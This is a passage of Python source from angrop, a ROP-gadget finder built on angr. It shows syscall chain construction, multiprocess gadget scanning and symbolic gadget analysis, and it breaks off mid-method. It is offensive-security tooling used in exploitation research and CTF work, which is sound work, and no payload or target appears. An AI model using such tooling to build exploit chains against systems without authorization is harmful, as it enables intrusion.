        :return: a RopChain which makes the system with the requested register contents
        """
        if not self.syscall_gadgets:
            raise RopException("target does not contain syscall gadget!")

        # set the system call number
        cc = angr.SYSCALL_CC[self.project.arch.name]["default"](self.project.arch)

        # find small stack change syscall gadget that also fits the stack arguments we want
        # FIXME: does any arch/OS take syscall arguments on stack? (windows? sysenter?)
        if len(args) > len(cc.ARG_REGS):
            raise NotImplementedError("Currently, we can't handle on stack system call arguments!")
        registers = {}
        for arg, reg in zip(args, cc.ARG_REGS):
            registers[reg] = rop_utils.cast_rop_value(arg, self.project)

        more = kwargs.pop('preserve_regs', set())

        # do per-request gadget filtering
        gadgets = self._per_request_filtering(syscall_num, registers, more, needs_return)
        orig_registers = registers
        for gadget in gadgets:
            registers = dict(orig_registers) # create a copy of it
            preserve_regs = set(more)
            extra_regs = {self.sysnum_reg: syscall_num}

            # at this point, we know all the concrete_regs are good, just remove the requirementes
            for reg in gadget.prologue.concrete_regs:
                if reg in extra_regs:
                    del extra_regs[reg]
                if reg in registers:
                    preserve_regs.add(reg)

            # now, check whether there are clobbered registers
            p = gadget.prologue
            clobbered_regs = p.changed_regs - p.popped_regs - set(p.concrete_regs.keys())
            tmp = set(preserve_regs)
            tmp = tmp.union(registers.keys())
            tmp = tmp.union(extra_regs.keys())
            if clobbered_regs.intersection(tmp):
                continue

            try:
                chain = self._func_call(gadget, cc, args, extra_regs=extra_regs,
                               needs_return=needs_return, preserve_regs=preserve_regs, **kwargs)
                if self.verify(chain, registers, more):
                    return chain
            except RopException:
                continue

        raise RopException(f"Fail to invoke syscall {syscall_num} with arguments: {args}!")

```

`angrop/common.py`:

```py
def str_find_all(a_str, sub):
    start = 0
    while True:
        start = a_str.find(sub, start)
        if start == -1:
            return
        yield start
        start += 1

```

`angrop/errors.py`:

```py
class RegNotFoundException(Exception):
    pass


class RopException(Exception):
    pass


class RopTimeoutException(RopException):
    pass

```

`angrop/gadget_finder/__init__.py`:

```py
import os
import re
import time
import signal
import logging
import multiprocessing as mp
from functools import partial

import tqdm
import psutil

from angr.errors import SimEngineError, SimMemoryError
from angr.misc.loggers import CuteFormatter

from . import gadget_analyzer
from ..arch import get_arch
from ..arch import ARM, X86, AMD64, AARCH64

l = logging.getLogger(__name__)

logging.getLogger('pyvex.lifting').setLevel("ERROR")

ANALYZE_GADGET_TIMEOUT = 3
_global_gadget_analyzer: gadget_analyzer.GadgetAnalyzer = None # type: ignore
_global_skip_cache = None
_global_cache = None
_global_init_rss = None

# disable loggers in each worker
def _disable_loggers():
    for handler in logging.root.handlers:
        if type(handler.formatter) == CuteFormatter:
            logging.root.removeHandler(handler)
            return

# global initializer for multiprocessing
def _set_global_gadget_analyzer(rop_gadget_analyzer):
    global _global_gadget_analyzer, _global_skip_cache, _global_cache, _global_init_rss # pylint: disable=global-statement
    _global_gadget_analyzer = rop_gadget_analyzer
    _global_skip_cache = set()
    _global_cache = {}
    _disable_loggers()
    process = psutil.Process()
    _global_init_rss = process.memory_info().rss

def alarm_handler(signum, frame): # pylint: disable=unused-argument
    l.warning("[angrop] worker_func2 times out, exit the worker process!")
    os._exit(0)

def worker_func1(cslice):
    analyzer = _global_gadget_analyzer
    res = list(GadgetFinder._addresses_from_slice(analyzer, cslice, _global_skip_cache, _global_cache, None))
    return (cslice[1]-cslice[0]+1, res)

def worker_func2(addr, cond_br=None):
    analyzer = _global_gadget_analyzer
    signal.signal(signal.SIGALRM, alarm_handler)

    signal.alarm(ANALYZE_GADGET_TIMEOUT)
    if cond_br is None:
        res = analyzer.analyze_gadget(addr)
    else:
        res = analyzer.analyze_gadget(addr, allow_conditional_branches=cond_br)
    signal.alarm(0)

    if not res:
        # HACK: we are seeing some very bad memory leak situation, restart the worker
        process = psutil.Process()
        rss = process.memory_info().rss
        if rss - _global_init_rss > 500*1024*1024:
            l.warning("[angrop] worker_func2 encounters memory leak, exit the worker process!")
            os._exit(0)

    if res is None:
        return []
    if isinstance(res, list):
        return res
    return [res]

class GadgetFinder:
    """
    a class to find ROP gadgets
    """
    def __init__(self, project, fast_mode=None, only_check_near_rets=True, max_block_size=None,
                 max_sym_mem_access=None, is_thumb=False, kernel_mode=False, stack_gsize=80,
                 cond_br=False, max_bb_cnt=2):
        # configurations
        self.project = project
        self.fast_mode = fast_mode
        self.arch = get_arch(self.project, kernel_mode=kernel_mode)
        self.only_check_near_rets = only_check_near_rets
        self.kernel_mode = kernel_mode
        self.stack_gsize = stack_gsize
        self.cond_br = cond_br
        self.max_bb_cnt = max_bb_cnt

        if only_check_near_rets and not isinstance(self.arch, (X86, AMD64, AARCH64)):
            l.warning("only_check_near_rets only makes sense for i386/amd64/aarch64, setting it to False")
            self.only_check_near_rets = False

        # override parameters
        if max_block_size:
            self.arch.max_block_size = max_block_size
        if max_sym_mem_access:
            self.arch.max_sym_mem_access = max_sym_mem_access
        if is_thumb:
            assert isinstance(self.arch, ARM), "is_thumb is only compatible with ARM binaries!"
            arch: ARM = self.arch
            arch.set_thumb()

        # internal stuff
        self._ret_locations: list = None # type: ignore
        self._syscall_locations: list = None # type: ignore
        # cache seen blocks, dict(block_hash => sets of addresses)
        self._cache: dict = None # type: ignore
        self._gadget_analyzer: gadget_analyzer.GadgetAnalyzer = None # type: ignore
        self._executable_ranges = None

        # silence annoying loggers
        logging.getLogger('angr.engines.vex.ccall').setLevel(logging.CRITICAL)
        logging.getLogger('angr.engines.vex.expressions.ccall').setLevel(logging.CRITICAL)
        logging.getLogger('angr.engines.vex.irop').setLevel(logging.CRITICAL)
        logging.getLogger('pyvex.lifting.libvex').setLevel(logging.CRITICAL)
        logging.getLogger('angr.state_plugins.symbolic_memory').setLevel(logging.CRITICAL)
        logging.getLogger('angr.state_plugins.posix').setLevel(logging.CRITICAL)
        logging.getLogger('angr.procedures').setLevel(logging.CRITICAL)

    @property
    def gadget_analyzer(self):
        if self._gadget_analyzer is not None:
            return self._gadget_analyzer
        self._initialize_gadget_analyzer()
        return self._gadget_analyzer

    def _initialize_gadget_analyzer(self):

        if self.kernel_mode or not self.only_check_near_rets:
            self._syscall_locations = []
        else:
            self._syscall_locations = self._get_syscall_locations()

        # find locations to analyze
        if self.only_check_near_rets and not self._ret_locations:
            self._ret_locations = self._get_ret_locations()
        num_to_check = self._num_addresses_to_check()

        # fast mode
        if self.fast_mode is None:
            if num_to_check > 20000:
                self.fast_mode = True
                l.warning("Enabling fast mode for large binary")
            else:
                self.fast_mode = False
        if self.fast_mode:
            self.arch.max_block_size = self.arch.fast_mode_max_block_size
            self.arch.max_sym_mem_access = 1
            # Recalculate num addresses to check based on fast_mode settings
            num_to_check = self._num_addresses_to_check()

        l.info("There are %d addresses within %d bytes of a ret",
               num_to_check, self.arch.max_block_size)

        self._gadget_analyzer = gadget_analyzer.GadgetAnalyzer(self.project, self.fast_mode, arch=self.arch,
                                                               kernel_mode=self.kernel_mode,
                                                               stack_gsize=self.stack_gsize,
                                                               cond_br=self.cond_br, max_bb_cnt=self.max_bb_cnt)

    def analyze_gadget(self, addr, allow_conditional_branches=None):
        g = self.gadget_analyzer.analyze_gadget(addr, allow_conditional_branches=allow_conditional_branches)
        if isinstance(g, list):
            for x in g:
                x.project = self.project
        elif g:
            g.project = self.project
        return g

    def _truncated_slices(self):
        for cslice in self._slices_to_check():
            size = cslice[1] - cslice[0] + 1
            if size <= 0x100:
                yield cslice
                continue
            while cslice[1] - cslice[0] + 1 > 0x100:
                new = (cslice[0], cslice[0]+0xff)
                cslice = (cslice[0]+0x100, cslice[1])
                yield new
            yield cslice

    def _multiprocess_static_analysis(self, processes, show_progress, timeout):
        """
        use multiprocessing to build the cache
        """
        start = time.time()
        task_len = self._num_addresses_to_check()
        todos = []

        t = None
        if show_progress:
            t = tqdm.tqdm(smoothing=0, total=task_len, desc="ROP", maxinterval=0.5, dynamic_ncols=True)

        initargs = (self.gadget_analyzer,)
        with mp.Pool(processes=processes, initializer=_set_global_gadget_analyzer, initargs=initargs) as pool:
            for n, results in pool.imap_unordered(worker_func1, self._truncated_slices(), chunksize=40):
                if t:
                    t.update(n)
                for addr, h in results:
                    if addr is None:
                        continue
                    if h:
                        if h in self._cache:
                            self._cache[h].add(addr)
                        else:
                            self._cache[h] = {addr}
                            todos.append(addr)
                    else:
                        todos.append(addr)
                if timeout is not None and time.time() - start > timeout:
                    break

        remaining = None
        if timeout is not None:
            remaining = timeout - (time.time() - start)
        return todos, remaining

    def _analyze_gadgets_multiprocess(self, processes, tasks, show_progress, timeout, cond_br):
        gadgets = []
        start = time.time()

        # select the target function
        if cond_br is not None:
            func = partial(worker_func2, cond_br=cond_br)
        else:
            func = worker_func2

        # the progress bar
        t = None
        if show_progress:
            t = tqdm.tqdm(smoothing=0, total=len(tasks), desc="ROP", maxinterval=0.5, dynamic_ncols=True)

        # prep for the main loop
        sync_data = [time.time(), 0]
        def on_success(gs):
            gadgets.extend(gs)
            if t:
                t.update(1)
            sync_data[0] = time.time()
            sync_data[1] += 1

        # the main loop
        initargs = (self.gadget_analyzer,)
        with mp.Pool(processes=processes, initializer=_set_global_gadget_analyzer, initargs=initargs) as pool:
            for addr in tasks:
                pool.apply_async(func, args=(addr,), callback=on_success)
            pool.close()

            def should_continue():
                if sync_data[1] == len(tasks):
                    return False
                if sync_data[1] > len(tasks)*0.8:
                    return time.time() - sync_data[0] < ANALYZE_GADGET_TIMEOUT
                return time.time() - sync_data[0] < ANALYZE_GADGET_TIMEOUT*5

            while should_continue():
                if timeout and time.time() - start > timeout:
                    break
                time.sleep(0.1)

            pool.terminate()
        if t is not None:
            t.close()

        for g in gadgets:
            g.project = self.project

        return sorted(gadgets, key=lambda x: x.addr)

    def analyze_gadget_list(self, addr_list, processes=4, show_progress=True):
        return self._analyze_gadgets_multiprocess(processes, addr_list, show_progress, None, False)

    def get_duplicates(self):
        """
        return duplicates that have been seen at least twice
        """
        cache = self._cache
        return {k:v for k,v in cache.items() if len(v) >= 2}

    def find_gadgets(self, processes=4, show_progress=True, timeout=None):
        assert self.gadget_analyzer is not None
        self._cache = {}
        timeout1 = timeout/2 if timeout is not None else None
        tasks, remaining = self._multiprocess_static_analysis(processes, show_progress, timeout1)
        timeout = remaining+timeout/2 if timeout is not None else None
        return self._analyze_gadgets_multiprocess(processes, tasks, show_progress, timeout, None), self.get_duplicates()

    def find_gadgets_single_threaded(self, show_progress=True):
        gadgets = []
        self._cache = {}

        assert self.gadget_analyzer is not None

        for addr in self._addresses_to_check_with_caching(show_progress):
            res = self.gadget_analyzer.analyze_gadget(addr)
            if res is None:
                continue
            if isinstance(res, list):
                gadgets.extend(res)
                continue
            gadgets.append(res)

        for g in gadgets:
            g.project = self.project

        return sorted(gadgets, key=lambda x: x.addr), self.get_duplicates()

    #### generate addresses from slices ####
    @staticmethod
    def _addr_block_in_cache(analyzer, loc, skip_cache, cache):
        """
        To avoid loading the block, we first check if the data that we would
        disassemble is already in the cache first
        """
        data = analyzer.project.loader.memory.load(loc, analyzer.arch.max_block_size)
        align = analyzer.arch.alignment
        for i in range(align, len(data)+1, align):
            h = data[0:i]
            if h in skip_cache or h in cache:
                return True
        return False

    @staticmethod
    def _addresses_from_slice(analyzer, cslice, skip_cache, cache, it):
        offset = 1 if isinstance(analyzer.arch, ARM) and analyzer.arch.is_thumb else 0
        alignment = analyzer.arch.alignment
        max_block_size = analyzer.arch.max_block_size

        def do_update():
            if it is not None:
                it.update(1)

        skip_addrs = set()
        simple_cache = set()
        for addr in range(cslice[0], cslice[1]+1, alignment):
            # when loading from memory, use loc
            # when calling block, use addr
            loc = addr
            addr += offset # this is the actual address

            if addr in skip_addrs:
                do_update()
                continue

            if GadgetFinder._addr_block_in_cache(analyzer, loc, skip_cache, cache):
                do_update()
                continue

            try:
                bl = analyzer.project.factory.block(addr, skip_stmts=True, max_size=analyzer.arch.max_block_size+0x10)
            except (SimEngineError, SimMemoryError):
                do_update()
                continue
            # check size
            if bl.size > max_block_size:
                for ins_addr in bl.instruction_addrs:
                    size = bl.size-(ins_addr-addr)
                    if size > max_block_size:
                        skip_addrs.add(ins_addr)
                do_update()
                continue
            # check jumpkind
            jumpkind = bl.vex_nostmt.jumpkind
            if jumpkind == 'Ijk_NoDecode':
                do_update()
                continue
            if jumpkind in ('Ijk_SigTRAP', 'Ijk_Privileged', 'Ijk_Yield'):
                for ins_addr in bl.instruction_addrs:
                    bad = bl.bytes[ins_addr-addr:]
                    skip_cache.add(bad)
                    skip_addrs.add(ins_addr)
                do_update()
                continue
            if analyzer._fast_mode and jumpkind not in ("Ijk_Ret", "Ijk_Boring") and \
                    not jumpkind.startswith('Ijk_Sys_'):
                for ins_addr in bl.instruction_addrs:
                    bad = bl.bytes[ins_addr-addr:]
                    skip_cache.add(bad)
                    skip_addrs.add(ins_addr)
                do_update()
                continue
            # check conditional jumps
            if not analyzer._allow_conditional_branches and len(bl.vex_nostmt.constant_jump_targets) > 1:
                for ins_addr in bl.instruction_addrs:
                    bad = bl.bytes[ins_addr-addr:]
                    skip_cache.add(bad)
                    skip_addrs.add(ins_addr)
                do_update()
                continue
            # make sure all the jump targets are valid
            valid = True
            for target in bl.vex_nostmt.constant_jump_targets:
                if analyzer.project.loader.find_segment_containing(target) is None:
                    valid = False
            if not valid:
                for ins_addr in bl.instruction_addrs:
                    skip_addrs.add(ins_addr)
                do_update()
                continue

            # it doesn't make sense to include a gadget that starts with a jump or call
            # the jump target itself will be the gadget
            if bl.vex_nostmt.instructions == 1 and jumpkind in ('Ijk_Boring', 'Ijk_Call'):
                do_update()
                continue

            ####### use vex ########
            if not analyzer._block_make_sense_vex(bl) or not analyzer._block_make_sense_sym_access(bl) or \
                    not analyzer.arch.block_make_sense(bl):
                do_update()
                continue
            if not bl.capstone.insns:
                do_update()
                continue

            # we only analyze simple gadgets once
            h = None
            if addr in simple_cache or analyzer._is_simple_gadget(addr, bl):
                # if a block is simple, all aligned sub blocks are simple
                for ins_addr in bl.instruction_addrs:
                    simple_cache.add(ins_addr)
                h = analyzer.block_hash(bl)
                if h not in cache:
                    cache[h] = {addr}
                else:
                    cache[h].add(addr)
            elif jumpkind.startswith("Ijk_Sys_"):
                h = analyzer.block_hash(bl)
            else:
                s = ''
                for insn in bl.capstone.insns:
                    s += insn.mnemonic + '\t' + insn.op_str + '\n'
                h = hash(s)
            do_update()
            yield addr, h

    def _addresses_to_check_with_caching(self, show_progress=True):
        """
        The goal of this function is to do a fast check of the block
        only jumpkind, jump targets check and cache the result to avoid the need of symbolically
        analyzing a ton of gadget candidates
        """
        num_addrs = self._num_addresses_to_check()

        it = None
        if show_progress:
            it = tqdm.tqdm(smoothing=0, total=num_addrs,
                           desc="ROP", maxinterval=0.5, dynamic_ncols=True)
        self._cache = {}
        skip_cache = set() # bytes to skip
        for cslice in self._slices_to_check():
            for addr, _ in self._addresses_from_slice(self.gadget_analyzer, cslice, skip_cache, self._cache, it):
                yield addr

    def block_hash(self, block):
        """
        a hash to uniquely identify a simple block
        """
        if block.vex.jumpkind.startswith('Ijk_Sys_'):
            next_addr = block.addr + block.size
            obj = self.project.loader.find_object_containing(next_addr)
            if not obj:
                return block.bytes
            next_block = self.project.factory.block(next_addr)
            return block.bytes + next_block.bytes
        return block.bytes

    #### generate slices to analyze ####
    def _get_executable_ranges(self):
        """
        returns the ranges which are executable
        """
        if self._executable_ranges is not None:
            return self._executable_ranges

        # For kernel_mode we use .text if we can find it
        if self.kernel_mode:
            for section in self.project.loader.main_object.sections:
                if section.name == ".text":
                    self._executable_ranges = [section]
                    return self._executable_ranges

        # use segments otherwise
        executable_segments = []
        for segment in self.project.loader.main_object.segments:
            if segment.is_executable:
                executable_segments.append(segment)
        self._executable_ranges = executable_segments
        return self._executable_ranges

    def _addr_in_executable_memory(self, addr):
        """
        :return: is the address in executable memory
        """
        executable_ranges = self._get_executable_ranges()
        for r in executable_ranges:
            if r.contains_addr(addr):
                return True
        return False

    def _find_executable_range(self, addr):
        for r in self._get_executable_ranges():
            if r.contains_addr(addr):
                return r
        return None

    def _get_slice_by_addr(self, addr, blocksize):
        start = addr - blocksize
        end = addr
        seg = self._find_executable_range(addr)
        assert seg is not None
        start = max(start, seg.min_addr)
        return (start, end)

    @staticmethod
    def merge_slices(slices):
        """
        generate a list of slices that don't overlap
        """
        if not slices:
            return []

        # sort by start of each slice
        slices.sort(key=lambda x: x[0])

        merged = [slices[0]]
        for current in slices[1:]:
            last = merged[-1]
            if current[0] <= last[1]: # overlapping
                merged[-1] = (last[0], max(last[1], current[1])) # merge
            else:
                merged.append(current)
        return merged

    def _slices_to_check(self, do_sort=True):
        """
        :return: all the slices to check, slice is inclusive: [start, end]
        """
        alignment = self.arch.alignment
        blocksize = (self.arch.max_block_size & ((1 << self.project.arch.bits) - alignment)) + alignment

        if self.only_check_near_rets:
            slices = []
            if not self.arch.kernel_mode and self._syscall_locations:
                slices += [self._get_slice_by_addr(addr, blocksize) for addr in self._syscall_locations]
            if self._ret_locations:
                slices += [self._get_slice_by_addr(addr, blocksize) for addr in self._ret_locations]

            # avoid decoding one address multiple times
            slices = self.merge_slices(slices)
            if not do_sort:
                yield from slices
                return

            # prioritize syscalls, so we still have syscall gadgets even if we timeout during gadget analysis
            start = time.time()
            syscall_locations = sorted(list(self._syscall_locations))
            slices1 = []
            for s in slices:
                if not syscall_locations:
                    break
                loc = syscall_locations[0]
                if s[0] <= loc <= s[1]:
                    slices1.append(s)
                    for idx in range(1, len(syscall_locations)):
                        if s[0] <= syscall_locations[idx] <= s[1]:
                            continue
                        break
                    else:
                        break
                    syscall_locations = syscall_locations[idx:]
            slices2 = [s for s in slices if s not in slices1]

            yield from slices1 + slices2
        else:
            for segment in self._get_executable_ranges():
                start = alignment * ((segment.min_addr + alignment - 1) // alignment)
                end = segment.min_addr + segment.memsize
                end -= end % alignment
                end -= alignment # a slice is inclusive
                yield (start, end)

    def _num_addresses_to_check(self):
        cnt = 0
        for cslice in self._slices_to_check(do_sort=False):
            cnt += cslice[1] - cslice[0] + 1
        return cnt

    #### identify ret/syscall locations ####
    def _get_ret_locations(self):
        """
        :return: all the locations in the binary with a ret instruction
        """

        if self.arch.ret_insts:
            return self._get_locations_by_strings(self.arch.ret_insts)

        l.warning("Only have ret strings for i386/amd64/aarch64/riscv")
        l.warning("now start the slow path for identifying gadgets end with 'ret'")

        addrs = []
        seen = set()
        for segment in self._get_executable_ranges():
            alignment = self.arch.alignment
            min_addr = segment.min_addr + (alignment - segment.min_addr % alignment)

            # iterate through the code looking for rets
            for addr in range(min_addr, segment.max_addr, alignment):
                # dont recheck addresses we've seen before
                if addr in seen:
                    continue
                try:
                    block = self.project.factory.block(addr)
                    # if it has a ret get the return address
                    if block.vex.jumpkind.startswith("Ijk_Ret"):
                        ret_addr = block.instruction_addrs[-1]
                        # hack for mips pipelining
                        if self.project.arch.linux_name.startswith("mips"):
                            ret_addr = block.instruction_addrs[-2]
                        if ret_addr not in seen:
                            addrs.append(ret_addr)
                    # save the addresses in the block
                    seen.update(block.instruction_addrs)
                except (SimEngineError, SimMemoryError):
                    pass

        return sorted(addrs)

    def _get_syscall_locations(self):
        """
        uses a string filter to find all the system calls instructions
        :return: all the locations in the binary with a system call instruction
        """
        if not self.arch.syscall_insts:
            l.warning("Only have syscall strings for i386/amd64/mips, fail to identify syscall strings")
            return []
        return self._get_locations_by_strings(self.arch.syscall_insts)

    def _get_locations_by_strings(self, strings):
        fmt = b'(' + b')|('.join(strings) + b')'

        addrs = []
        for segment in self._get_executable_ranges():
            read_bytes = self.project.loader.memory.load(segment.min_addr, segment.memsize)
            # find all occurrences of the ret_instructions
            addrs += [segment.min_addr + m.start() for m in re.finditer(fmt, read_bytes)]
        return sorted(addrs)

```

`angrop/gadget_finder/gadget_analyzer.py`:

```py
import math
import ctypes
import logging
import itertools
from collections import defaultdict

import angr
import pyvex
import claripy
from angr.analyses.bindiff import differing_constants
from angr.analyses.bindiff import UnmatchedStatementsException
from angr.errors import SimEngineError, SimMemoryError

from .. import rop_utils
from ..arch import get_arch, X86
from ..rop_gadget import RopGadget, PivotGadget, SyscallGadget
from ..rop_effect import RopMemAccess, RopRegMove, RopRegPop
from ..rop_block import RopBlock
from ..errors import RopException, RegNotFoundException, RopTimeoutException

l = logging.getLogger("angrop.gadget_analyzer")


class GadgetAnalyzer:
    """
    find and analyze gadgets from binary code
    """
    def __init__(self, project, fast_mode, kernel_mode=False, arch=None, stack_gsize=80, cond_br=False, max_bb_cnt=2):
        """
        stack_gsize: number of controllable gadgets on the stack
        """
        # params
        self.project = project
        self.arch = get_arch(project, kernel_mode=kernel_mode) if arch is None else arch
        self._fast_mode = fast_mode
        self._allow_conditional_branches = cond_br
        self._max_bb_cnt = max_bb_cnt

        # initial state that others are based off, all analysis should copy the state first and work on
        # the copied state
        self._stack_bsize = stack_gsize * self.project.arch.bytes # number of controllable bytes on stack
        if isinstance(self.arch, X86):
            extra_reg_set = self.arch.segment_regs
        else:
            extra_reg_set = None
        self._state = rop_utils.make_symbolic_state(self.project, self.arch.reg_list, stack_gsize,
                                                    extra_reg_set=extra_reg_set, symbolize_got=True)
        self._concrete_sp = self._state.solver.eval(self._state.regs.sp)

    def analyze_gadget(self, addr, allow_conditional_branches=None) -> list[RopGadget] | RopGadget | None:
        """
        Find gadgets at the given address.

        Support for gadgets with conditional branches can be enabled using the
        allow_conditional_branches option, which is False by default for
        compatibility with existing code that can't handle these gadgets.
        Returns a list of gadgets when allow_conditional_branches is enabled,
        and a single gadget or None when it is disabled.

        :param addr: address to analyze for gadgets
        :param allow_conditional_branches: whether to allow gadgets with conditional branches
        :return: a list of RopGadget instances or a single RopGadget instance
        """
        if allow_conditional_branches is None:
            allow_conditional_branches = self._allow_conditional_branches
        try:
            gadgets = self._analyze_gadget(addr, allow_conditional_branches)
        except RopTimeoutException:
            return [] if allow_conditional_branches else None
        if allow_conditional_branches:
            return gadgets
        else:
            assert len(gadgets) <= 1
            return (
                gadgets[0]
                if gadgets and not gadgets[0].has_conditional_branch
                else None
            )

    def _step_to_gadget_stopping_states(self, init_state):
        """
        Currently, the following scenarios are considered as stopping states:
        1. unconstrained (e.g. ret)
        2. invokes syscall (e.g. syscall)

        for gadgets invoking syscalls, we will try to step over it to find gadgets such as "syscall; ret"
        """
        try:
            simgr = self.project.factory.simulation_manager(init_state, save_unconstrained=True)

            def filter_func(state):
                if not state.ip.concrete:
                    return None
                if self.project.is_hooked(state.addr):
                    # We don't want to go into SimProcedures.
                    return simgr.DROP
                if rop_utils.is_in_kernel(self.project, state):
                    return "syscall"
                if not self._block_make_sense(state.addr):
                    return simgr.DROP
                return None

            simgr.run(n=self._max_bb_cnt, filter_func=filter_func)
            simgr.move(from_stash='active', to_stash='syscall',
                       filter_func=lambda s: rop_utils.is_in_kernel(self.project, s))

        except (claripy.ClaripySolverInterruptError, claripy.errors.ClaripyZ3Error, ValueError): # type: ignore
            return [], []
        except (claripy.ClaripyFrontendError,
                angr.engines.vex.claripy.ccall.CCallMultivaluedException) as e: # type: ignore
            l.warning("... claripy error: %s", e)
            return [], []
        except (angr.errors.AngrError, angr.errors.AngrRuntimeError, angr.errors.SimError):
            return [], []
        except RopTimeoutException:
            return [], []
        except (ctypes.ArgumentError, RecursionError):
            return [], []

        final_states = list(simgr.unconstrained)
        if "syscall" in simgr.stashes:
            final_states.extend(self._try_stepping_past_syscall(state) for state in simgr.syscall)

        bad_states = simgr.active + simgr.deadended

        return final_states, bad_states

    @rop_utils.timeout(3)
    def _analyze_gadget(self, addr, allow_conditional_branches):
        l.info("Analyzing 0x%x", addr)

        # Step 1: first statically check if the block can reach stopping states
        #         static analysis is much faster
        if not self._can_reach_stopping_states(addr, allow_conditional_branches, max_steps=self._max_bb_cnt):
            return []

        # Step 2: get all potential successor states
        init_state = self._state.copy()
        init_state.ip = addr
        final_states, bad_states = self._step_to_gadget_stopping_states(init_state)

        if not allow_conditional_branches and (bad_states or len(final_states) != 1):
            return []

        gadgets = []

        for final_state in final_states:
            try:
                if not self._valid_state(init_state, final_state):
                    continue

                ctrl_type = self._check_for_control_type(init_state, final_state)
                if not ctrl_type:
                    # for example, jump outside of the controllable region
                    l.debug("... cannot maintain the control flow hijacking primitive after executing the gadget")
                    continue

                # Step 3: gadget effect analysis
                l.debug("... analyzing rop potential of block")
                gadget = self._create_gadget(addr, init_state, final_state, ctrl_type, allow_conditional_branches)
                if not gadget:
                    continue

                l.debug("... Appending gadget!")
                gadgets.append(gadget)

            except RopTimeoutException:
                return gadgets
            except RopException as e:
                l.debug("... %s", e)
                continue
            except (claripy.ClaripySolverInterruptError, claripy.errors.ClaripyZ3Error, ValueError): # type: ignore
                continue
            except (claripy.ClaripyFrontendError,
                    angr.engines.vex.claripy.ccall.CCallMultivaluedException) as e: # type: ignore
                l.warning("... claripy error: %s", e)
                continue
            except (angr.errors.AngrError, angr.errors.AngrRuntimeError, angr.errors.SimError):
                continue
            except (ctypes.ArgumentError, RecursionError):
                continue

        return gadgets

    def _valid_state(self, init_state, final_state):
        if self._change_arch_state(init_state, final_state):
            return False
        # stack change is too large
        if not final_state.regs.sp.symbolic and \
                final_state.regs.sp.concrete_value - self._concrete_sp > self._stack_bsize:
            return False
        return True

    def _change_arch_state(self, init_state, final_state):
        if isinstance(self.arch, X86):
            for reg in self.arch.segment_regs:
                init_reg= init_state.registers.load(reg)
                final_reg = final_state.registers.load(reg)
                # check whether there is any possibility that they can be different
                if final_state.solver.satisfiable([init_reg != final_reg]):
                    return True
        return False

    def _block_make_sense_nostmt(self, block):
        if block.size > self.arch.max_block_size:
            l.debug("... too long")
            return False
        if block.vex.jumpkind in ('Ijk_SigTRAP', 'Ijk_NoDecode', 'Ijk_Privileged', 'Ijk_Yield'):
            l.debug("... not decodable")
            return False
        for target in block.vex.constant_jump_targets:
            if self.project.loader.find_segment_containing(target) is None:
                return False
        if self._fast_mode:
            if block.vex.jumpkind != "Ijk_Ret" and not block.vex.jumpkind.startswith("Ijk_Sys"):
                return False
        return True

    def _block_make_sense_vex(self, block):
        # we don't like floating point and SIMD stuff
        if any(t in block.vex.tyenv.types for t in ('Ity_F16', 'Ity_F32', 'Ity_F64', 'Ity_F128', 'Ity_V128')):
            return False

        if any(isinstance(s, pyvex.IRStmt.Dirty) for s in block.vex.statements):
            l.debug("... has dirties that we probably can't handle")
            return False

        # make sure all constant memory accesses are in-bound
        for expr in block.vex.expressions:
            if expr.tag in ('Iex_Load', 'Ist_Store'):
                if isinstance(expr.addr, pyvex.expr.Const):
                    if self.project.loader.find_segment_containing(expr.addr.con.value) is None:
                        return False

        for op in block.vex.operations:
            if op.startswith("Iop_Div"):
                return False

        return True

    def _block_make_sense_sym_access(self, block):
        # make sure there are not too many symbolic accesses
        # note that we can't actually distinguish between memory accesses on stack
        # and other memory accesses, we just assume all non-word access are symbolic memory accesses
        # consider at most one access each instruction

        # split statements by instructions
        accesses = set()
        word_ty = f'Ity_I{self.project.arch.bits}'
        insts = []
        inst = []
        for stmt in block.vex.statements:
            if isinstance(stmt, pyvex.stmt.IMark):
                insts.append(inst)
                inst = []
            else:
                inst.append(stmt)
        if inst:
            insts.append(inst)
        # count memory accesses
        for inst in insts:
            exprs = itertools.chain(*[x.expressions for x in inst])
            for expr in exprs:
                if expr.tag not in ('Iex_Load', 'Ist_Store'):
                    continue
                if isinstance(expr.addr, pyvex.expr.Const):
                    continue
                if expr.ty == word_ty:
                    continue
                accesses.add(str(expr.addr))
                break
        if len(accesses) > self.arch.max_sym_mem_access:
            return False
        return True

    def _block_make_sense(self, addr):
        """
        Checks if a block at addr makes sense to analyze for rop gadgets
        :param addr: the address to check
        :return: True or False
        """
        if self.project.loader.find_object_containing(addr) != self.project.loader.main_object:
            return False
        try:
            l.debug("... checking if block makes sense")
            block = self.project.factory.block(addr)
        except angr.errors.SimEngineError:
            l.debug("... some simengine error")
            return False
        except pyvex.PyVEXError:
            l.debug("... some pyvex")
            return False
        except angr.SimCCallError:
            l.debug("... some other angr error")
            return False
        except angr.SimMemoryLimitError:
            l.debug("... angr memory limit error")
            return False
        except angr.UnsupportedIROpError:
            l.debug("... angr unsupported op error")
            return False
        except angr.AngrError:
            return False
        except AttributeError:
            return False
        except KeyError:
            return False

        if not self._block_make_sense_nostmt(block):
            return False
        if not self._block_make_sense_vex(block):
            return False
        if not self._block_make_sense_sym_access(block):
            return False

        if not self.arch.block_make_sense(block):
            return False

        if not block.capstone.insns:
            return False


        return True

    def is_in_kernel(self, state):
        return rop_utils.is_in_kernel(self.project, state)

    def is_kernel_addr(self, addr):
        return rop_utils.is_kernel_addr(self.project, addr)

    def _can_reach_stopping_states(self, addr, allow_conditional_branches, max_steps=2):
        """
        Use static analysis to check whether the address can lead to unconstrained targets
        It is much faster than directly doing symbolic execution on the addr
        """
        if not self._block_make_sense(addr):
            return False

        b = self.project.factory.block(addr)

        if max_steps == self._max_bb_cnt: # this is the very first basic block
            # it doesn't make sense to have a gadget that starts with a conditional jump
            # this type of gadgets should be represented by two gadgets after the jump
            if b._instructions == 1 and len(b.vex.constant_jump_targets) > 1:
                return False

        constant_jump_targets = list(b.vex.constant_jump_targets)

        if not constant_jump_targets:
            return True

        if not allow_conditional_branches and len(constant_jump_targets) > 1:
            return False

        if max_steps == 0:
            return False

        for target_block_addr in constant_jump_targets:
            if self._can_reach_stopping_states(target_block_addr, allow_conditional_branches, max_steps-1):
                return True
        return False

    def _try_stepping_past_syscall(self, state):
        simgr = self.project.factory.simgr(state, save_unconstrained=True)
        def filter_func(state):
            if not state.ip.concrete:
                return None
            if self.project.is_hooked(state.addr):
                # We don't want to go into SimProcedures.
                return simgr.DROP
            if not self.is_in_kernel(state) and not self._block_make_sense(state.addr):
                return simgr.DROP
            return None
        try:
